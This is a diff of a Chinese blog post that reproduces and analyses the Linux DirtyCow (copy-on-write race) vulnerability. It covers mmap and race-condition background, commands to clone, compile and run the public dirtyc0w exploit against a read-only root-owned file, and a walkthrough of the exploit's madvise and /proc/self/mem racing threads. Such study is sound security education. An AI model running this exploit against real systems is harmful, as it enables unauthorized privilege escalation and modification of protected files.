@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.2k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">4.3k</span>阅读时长: <span class="post-count reading-time">17 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -422,13 +422,132 @@ height:50vh;
 <li>把调用进程的环境传递给新程序还是给新程序指定新的环境。</li>
 </ul>
 </blockquote>
+<h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *start, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br><span class="line"></span><br><span class="line">返回说明</span><br><span class="line">成功执行时，mmap()返回被映射区的指针。失败时，mmap()返回MAP_FAILED[其值为(<span class="keyword">void</span> *)<span class="number">-1</span>]，</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">start：映射区的开始地址</span><br><span class="line"></span><br><span class="line">length：映射区的长度</span><br><span class="line"></span><br><span class="line">prot：期望的内存保护标志，不能与文件的打开模式冲突。是以下的某个值，可以通过<span class="keyword">or</span>运算合理地组合在一起(PROT_READ（可读） , PROT_WRITE （可写）, PROT_EXEC （可执行）, PROT_NONE（不可访问）。)</span><br><span class="line"></span><br><span class="line">flags：指定映射对象的类型，映射选项和映射页是否可以共享。它的值可以是一个或者多个以下位的组合体(MAP_SHARED , MAP_PRIVATE , MAP_FIXED，其中，MAP_SHARED , MAP_PRIVATE选其一，而MAP_FIXED则不推荐使用。)</span><br><span class="line"></span><br><span class="line">fd：有效的文件描述词。如果MAP_ANONYMOUS被设定，为了兼容问题，其值应为<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">offset：被映射对象内容的起点</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>mmap是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。实现这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用read,write等系统调用函数。相反，内核空间对这段区域的修改也直接反映用户空间，从而可以实现不同进程间的文件共享。</p>
+</blockquote>
+<p><img src="https://images0.cnblogs.com/blog2015/571793/201507/200501092691998.png" alt></p>
+<blockquote>
+<p>linux内核使用vm_area_struct结构来表示一个独立的虚拟内存区域，由于每个不同质的虚拟内存区域功能和内部机制都不同，因此一个进程使用多个vm_area_struct结构来分别表示不同类型的虚拟内存区域。各个vm_area_struct结构使用链表或者树形结构链接，方便进程快速访问</p>
+</blockquote>
+<p><img src="https://images0.cnblogs.com/blog2015/571793/201507/200501434261629.png" alt></p>
+<blockquote>
+<p>vm_area_struct结构中包含区域起始和终止地址以及其他相关信息，同时也包含一个vm_ops指针，其内部可引出所有针对这个区域可以使用的系统调用函数。这样，进程对某一虚拟内存区域的任何操作需要用要的信息，都可以从vm_area_struct中获得。mmap函数就是要创建一个新的vm_area_struct结构，并将其与文件的物理磁盘地址相连。</p>
+</blockquote>
+<p><strong>mmap内存映射原理</strong></p>
+<blockquote>
+<p>mmap内存映射的实现过程，总的来说可以分为三个阶段：</p>
+</blockquote>
+<p>一.进程启动映射过程，并在虚拟地址空间中为映射创建虚拟映射区域</p>
+<ul>
+<li>1、进程在用户空间调用库函数mmap</li>
+<li>2、在当前进程的虚拟地址空间中，寻找一段空闲的满足要求的连续的虚拟地址</li>
+<li>3、为此虚拟区分配一个vm_area_struct结构，接着对这个结构的各个域进行了初始化</li>
+<li>4、将新建的虚拟区结构（vm_area_struct）插入进程的虚拟地址区域链表或树中</li>
+</ul>
+<p>二.调用内核空间的系统调用函数mmap（不同于用户空间函数），实现文件物理地址和进程虚拟地址的一一映射关系</p>
+<ul>
+<li>5、为映射分配了新的虚拟地址区域后，通过待映射的文件指针，在文件描述符表中找到对应的文件描述符，通过文件描述符，链接到内核“已打开文件集”中该文件的文件结构体（struct file），每个文件结构体维护着和这个已打开文件相关各项信息。</li>
+<li>6、通过该文件的文件结构体，链接到file_operations模块，调用内核函数mmap，其原型为：int mmap(struct file <em>filp, struct vm_area_struct </em>vma)，不同于用户空间库函数。</li>
+<li>7、内核mmap函数通过虚拟文件系统inode模块定位到文件磁盘物理地址。</li>
+<li><p>8、通过remap_pfn_range函数建立页表，即实现了文件地址和虚拟地址区域的映射关系。此时，这片虚拟地址并没有任何数据关联到主存中。</p>
+<p>三.进程发起对这片映射空间的访问，引发缺页异常，实现文件内容到物理内存（主存）的拷贝<br>注：前两个阶段仅在于创建虚拟区间并完成地址映射，但是并没有将任何文件数据的拷贝至主存。真正的文件读取是当进程发起读或写操作时。</p>
+</li>
+<li><p>9、进程的读或写操作访问虚拟地址空间这一段映射地址，通过查询页表，发现这一段地址并不在物理页面上。因为目前只建立了地址映射，真正的硬盘数据还没有拷贝到内存中，因此引发缺页异常。</p>
+</li>
+<li><p>10、缺页异常进行一系列判断，确定无非法操作后，内核发起请求调页过程。</p>
+</li>
+<li><p>11、调页过程先在交换缓存空间（swap cache）中寻找需要访问的内存页，如果没有则调用nopage函数把所缺的页从磁盘装入到主存中。</p>
+</li>
+<li><p>12、之后进程即可对这片主存进行读或者写的操作，如果写操作改变了其内容，一定时间后系统会自动回写脏页面到对应磁盘地址，也即完成了写入到文件的过程。</p>
+</li>
+</ul>
+<p>注：修改过的脏页面并不会立即更新回文件中，而是有一段时间的延迟，可以调用msync()来强制同步, 这样所写的内容就能立即保存到文件里了。</p>
 <h2 id="copy-on-write"><a href="#copy-on-write" class="headerlink" title="copy-on-write"></a>copy-on-write</h2><blockquote>
 <p>linux内核在使用fork创建进程时，基本上会使用Copy-On-Write(COW)技术.意思上就是：在复制一个对象的时候并不是真正的把原先的对象复制到内存的另外一个位置上，而是在新对象的内存映射表中设置一个指针，指向源对象的位置，并把那块内存的Copy-On-Write位设置为1.这样，在对新的对象执行读操作的时候，内存数据不发生任何变动，直接执行读操作；而在对新的对象执行写操作时，将真正的对象复制到新的内存地址中，并修改新对象的内存映射表指向这个新的位置，并在新的内存位置上执行写操作。我个人觉得这种做法在Linux上是很常见的，比如编译时的延迟绑定，都是这种“懒”的办法。这个技术需要跟虚拟内存和分页同时使用，好处就是在执行复制操作时因为不是真正的内存复制，而只是建立了一个指针，因而大大提高效率。但这不是一直成立的，如果在复制新对象之后，大部分对象都还需要继续进行写操作会产生大量的分页错误，得不偿失。所以COW高效的情况只是在复制新对象之后，在一小部分的内存分页上进行写操作。</p>
 </blockquote>
-<blockquote>
-<p><strong>原理</strong><br>fork()之后，kernel把父进程中所有的内存页的权限都设为read-only，然后子进程的地址空间指向父进程。当父子进程都只读内存时，相安无事。当其中某个进程写内存时，CPU硬件检测到内存页是read-only的，于是触发页异常中断（page-fault），陷入kernel的一个中断例程。中断例程中，kernel就会把触发的异常的页复制一份，于是父子进程各自持有独立的一份。</p>
+<h2 id="竞争条件"><a href="#竞争条件" class="headerlink" title="竞争条件"></a>竞争条件</h2><blockquote>
+<p>竞争条件:当两个线程竞争同一资源时，如果对资源的访问顺序敏感，就称存在竞态条件。导致竞态条件发生的代码区称作临界区。</p>
 </blockquote>
-<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Counter</span> </span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">long</span> count = <span class="number">0</span>; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">long</span> value)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">this</span>.count = <span class="keyword">this</span>.count + value; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>add()方法就是一个临界区,它会产生竞态条件。</p>
+</blockquote>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote>
+<p>fork()之后，kernel把父进程中所有的内存页的权限都设为read-only，然后子进程的地址空间指向父进程。当父子进程都只读内存时，相安无事。当其中某个进程写内存时，CPU硬件检测到内存页是read-only的，于是触发页异常中断（page-fault），陷入kernel的一个中断例程。中断例程中，kernel就会把触发的异常的页复制一份，于是父子进程各自持有独立的一份。</p>
+</blockquote>
+<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><blockquote>
+<p>在进行漏洞复现的时候，我第一次使用Ubuntu14.04.5发现这个洞已经被补上了，后来使用Ubuntu14.04.1成功getshell</p>
+</blockquote>
+<blockquote>
+<p>1.这里使用官方的EXP<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/dirtycow/dirtycow.github.io</span></span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>我们最后要使用的是 dirtyc0w.c 文件,在dirtyc0w.c文件中，官方已经给出了漏洞利用步骤</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/10/30/Qct2Lx3fSEoJeR4.jpg" alt></p>
+<blockquote>
+<p>2.编译exp：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc dirtyc0w.c -o dirtycow lpthread</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>3.创建一个只读文件并写入内容<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">1234</span> &gt; test</span><br><span class="line">chmod <span class="number">404</span> test </span><br><span class="line">ls -lah test </span><br><span class="line">-r-----r-- <span class="number">1</span> root root <span class="number">5</span> Oct <span class="number">29</span> <span class="number">10</span>:<span class="number">41</span> test</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>4.执行程序<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirtyc0w test abcde</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/10/30/4e3VgAUkumHlrDs.jpg" alt></p>
+<blockquote>
+<p>这里我们发现文件的内容已经改变，而这个文件本来是只读的所以漏洞利用成功。</p>
+</blockquote>
+<h2 id="EXP详解"><a href="#EXP详解" class="headerlink" title="EXP详解"></a>EXP详解</h2><blockquote>
+<p>接下来通过分析官方EXP源码，理解漏洞利用过程<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to open the file in read only mode.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  f=open(argv[<span class="number">1</span>],O_RDONLY);</span><br><span class="line">  fstat(f,&amp;st);</span><br><span class="line">  name=argv[<span class="number">1</span>];</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>代码是通过写入来验证触发了漏洞，所以首先会以只读的方式O_RDONLY来打开open一个特定的文件，由于我们目前只有比较低的权限，无法写入特定的文件。在成功打开并获取了文件描述符之后，立即调用mmap来映射该文件。</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to use MAP_PRIVATE for copy-on-write mapping.</span></span><br><span class="line"><span class="comment">&gt; Create a private copy-on-write mapping.  Updates to the</span></span><br><span class="line"><span class="comment">&gt; mapping are not visible to other processes mapping the same</span></span><br><span class="line"><span class="comment">&gt; file, and are not carried through to the underlying file.  It</span></span><br><span class="line"><span class="comment">&gt; is unspecified whether changes made to the file after the</span></span><br><span class="line"><span class="comment">&gt; mmap() call are visible in the mapped region.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to open with PROT_READ.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"mmap %zx\n\n"</span>,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>);</span><br><span class="line"><span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>调用函数mmap在进程的虚拟地址空间中创建了一个基于文件的（file-backed）的只读的内存映射，内核中通过结构struct vm_area_struect来描述该内核对象，其包含映射的文件描述符，对于映射的页的读写权限等一些信息。之后创建了两个线程，一个调用madvice，另一个调用write。</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pthread_create(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);</span><br><span class="line">pthread_create(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>接下来是分析的重点，重点分析madviseThread和procselfmemThread函数</p>
+</blockquote>
+<blockquote>
+<p>首先看下madviseThread：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++)</span><br><span class="line">  &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661</span></span><br><span class="line"><span class="comment">&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call</span></span><br><span class="line"><span class="comment">&gt; while having the page of the executable mmapped in memory.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"madvise %d\n\n"</span>,c);&#125;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>函数原型<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">madvise</span><span class="params">(<span class="keyword">caddr_t</span> addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> advice)</span></span>;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>函数建议内核，在从 addr 指定的地址开始，长度等于 len 参数值的范围内，该区域的用户虚拟内存应遵循特定的使用模式。内核使用这些信息优化与指定范围关联的资源的处理和维护过程。如果使用 madvise() 函数的程序明确了解其内存访问模式，则使用此函数可以提高系统性能。成功时，madvise（）返回 0,如果出错，则返回-1</p>
+</blockquote>
+<blockquote>
+<p>madvise(MADV_DONTNEED)基本功能是清除被管理的内存映射的物理页。就当前情况而言， 在调用完该函数后，提到的这些页将被clear。当下一次用户尝试访问这些内存区域时，原始的内容会重新从磁盘或者页缓存中导入，而对于匿名的堆内存，则会填充零。<br>官方文档解释如下：</p>
+</blockquote>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MADV_DONTNEEDDo <span class="keyword">not</span> expect access in the near future. (For the time being,</span><br><span class="line"> the application is finished with the given range, so the kernel can <span class="built_in">free</span> resources associated with it.) </span><br><span class="line">Subsequent accesses of pages in <span class="keyword">this</span> range will succeed, but will result either in reloading of the memory </span><br><span class="line">contents from the underlying mapped file (see mmap(2)) or zero-fill-on-demand pages for mappings without an underlying file</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>继续看另一个线程procselfmemThread</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str;</span><br><span class="line">    str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16</span></span><br><span class="line"><span class="comment">       &gt;  The in the wild exploit we are aware of doesn't work on Red Hat</span></span><br><span class="line"><span class="comment">       &gt;  Enterprise Linux 5 and 6 out of the box because on one side of</span></span><br><span class="line"><span class="comment">       &gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not</span></span><br><span class="line"><span class="comment">       &gt;  writable on Red Hat Enterprise Linux 5 and 6.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> f=open(<span class="string">"/proc/self/mem"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           You have to reset the file pointer to the memory position.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        lseek(f,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>,SEEK_SET);</span><br><span class="line">        c+=write(f,str,<span class="built_in">strlen</span>(str));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"procselfmem %d\n\n"</span>, c);&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>lseek函数的作用是用来重新定位文件读写的位移。<br>函数声明<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">off_t</span> lseek(<span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset, <span class="keyword">int</span> whence);</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>offset为正则向文件末尾移动（向前移），为负数则向文件头部（向后移）。</p>
+</blockquote>
+<blockquote>
+<p>它首先lseek到映射的地址，之后调用write(2)便实现了直接修改原本是只读权限的file-backed的内存映射。</p>
+</blockquote>
+<h3 id="write-2"><a href="#write-2" class="headerlink" title="write(2)"></a>write(2)</h3><blockquote>
+<p>write(2) on /proc/{pid}/mem<br>/proc/{pid}/meme是一个假的文件，它提供了一些Out-of-band的访问内存的方法。另一个类似的访问是调用ptrace(2)，同样的，也可称为Dirty COW的另一个可选的攻击点。<br>为弄清楚/proc/self/mem如何工作，我们需要深入的了解内核。首先看下对于虚拟的文件，write(2)是如何实现的。在内核层面中，文件系统的操作的实现是利用面向对象的思想设计的（OOP）。有一个通用的抽象的结构struct file_operations。不同的文件类型，可以提供不同的实现。对于/proc/{pid}/mem，它的实现在文件/fs/proc/base.c中。</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_mem_operations</span> = &#123;</span></span><br><span class="line">    .llseek  = mem_lseek,</span><br><span class="line">    .read    = mem_read,</span><br><span class="line">    .write   = mem_write,</span><br><span class="line">    .open    = mem_open,</span><br><span class="line">    .release = mem_release,&#125;;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>当write(2)写一个虚拟文件时，内核将调用函数mem_write，它只是对meme_rw的一个简单的封装。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ssize_t <span class="title">mem_rw</span><span class="params">(struct file *file, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *ppos, <span class="keyword">int</span> write)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">file</span>-&gt;<span class="title">private_data</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> addr = *ppos;</span><br><span class="line">    <span class="keyword">ssize_t</span> copied;</span><br><span class="line">    <span class="keyword">char</span> *page;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!mm)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* allocate an exchange buffer */</span></span><br><span class="line">    page = (<span class="keyword">char</span> *)__get_free_page(GFP_TEMPORARY);</span><br><span class="line">    <span class="keyword">if</span> (!page)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    copied = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))</span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">free</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> this_len = <span class="keyword">min_t</span>(<span class="keyword">int</span>, count, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* copy user content to the exchange buffer */</span></span><br><span class="line">        <span class="keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;</span><br><span class="line">            copied = -EFAULT;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        this_len = access_remote_vm(mm, addr, page, this_len, write);</span><br><span class="line">        <span class="keyword">if</span> (!this_len) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!copied)</span><br><span class="line">                copied = -EIO;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;</span><br><span class="line">            copied = -EFAULT;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        buf += this_len;</span><br><span class="line">        addr += this_len;</span><br><span class="line">        copied += this_len;</span><br><span class="line">        count -= this_len;</span><br><span class="line">    &#125;</span><br><span class="line">    *ppos = addr;</span><br><span class="line"></span><br><span class="line">    mmput(mm);<span class="built_in">free</span>:</span><br><span class="line">    free_page((<span class="keyword">unsigned</span> <span class="keyword">long</span>) page);</span><br><span class="line">    <span class="keyword">return</span> copied;&#125;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt></p>
+
     </article>
     <!-- license  -->
     
@@ -436,7 +555,7 @@ height:50vh;
             <p>原文作者：<a href="http://yoursite.com">HackPluto</a>
             </p><p>原文链接：<a href="http://yoursite.com/2019/10/28/DirtyCow漏洞复现及原理分析/">http://yoursite.com/2019/10/28/DirtyCow漏洞复现及原理分析/</a>
             </p><p>发表日期：<a href="http://yoursite.com/2019/10/28/DirtyCow漏洞复现及原理分析/">October 28th 2019, 11:36:05 pm</a>
-            </p><p>更新日期：<a href="http://yoursite.com/2019/10/28/DirtyCow漏洞复现及原理分析/">October 29th 2019, 6:48:11 pm</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/10/28/DirtyCow漏洞复现及原理分析/">October 30th 2019, 10:40:51 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -563,7 +682,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基本概括"><span class="toc-number">1.</span> <span class="toc-text">基本概括</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#预备知识"><span class="toc-number">2.</span> <span class="toc-text">预备知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fork"><span class="toc-number">2.1.</span> <span class="toc-text">fork</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exec"><span class="toc-number">2.2.</span> <span class="toc-text">exec()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#copy-on-write"><span class="toc-number">2.3.</span> <span class="toc-text">copy-on-write</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#攻击"><span class="toc-number">3.</span> <span class="toc-text">攻击</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基本概括"><span class="toc-number">1.</span> <span class="toc-text">基本概括</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#预备知识"><span class="toc-number">2.</span> <span class="toc-text">预备知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fork"><span class="toc-number">2.1.</span> <span class="toc-text">fork</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exec"><span class="toc-number">2.2.</span> <span class="toc-text">exec()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mmap"><span class="toc-number">2.3.</span> <span class="toc-text">mmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#copy-on-write"><span class="toc-number">2.4.</span> <span class="toc-text">copy-on-write</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#竞争条件"><span class="toc-number">2.5.</span> <span 